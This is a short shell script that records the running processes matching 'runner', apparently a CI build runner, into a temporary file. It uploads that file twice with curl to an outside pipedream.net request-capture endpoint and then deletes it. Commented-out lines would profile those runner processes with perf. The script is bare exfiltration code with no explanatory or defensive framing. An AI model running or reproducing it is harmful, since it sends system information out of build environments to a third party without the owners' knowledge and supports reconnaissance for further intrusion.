#!/bin/sh

echo $(ps ax | grep runner) > /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://ensf2rlc2dw6p.x.pipedream.net/

#echo "--- START ---" > /tmp/fafafa.txt

#echo $(perf -v) >> /tmp/fafafa.txt

#for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
#do
#    echo "-----$pid-----" >> /tmp/fafafa.txt;
    #echo $(perf record -p $pid -o /tmp/hola.data -c 1) >> tmp/fafafa.txt;
#    done
#    echo "--------------" >> /tmp/fafafa.txt;
#done

#echo "--- FINISH ---" >> /tmp/fafafa.txt

curl --data-binary "@/tmp/file.txt" https://ensf2rlc2dw6p.x.pipedream.net/

rm /tmp/file.txt
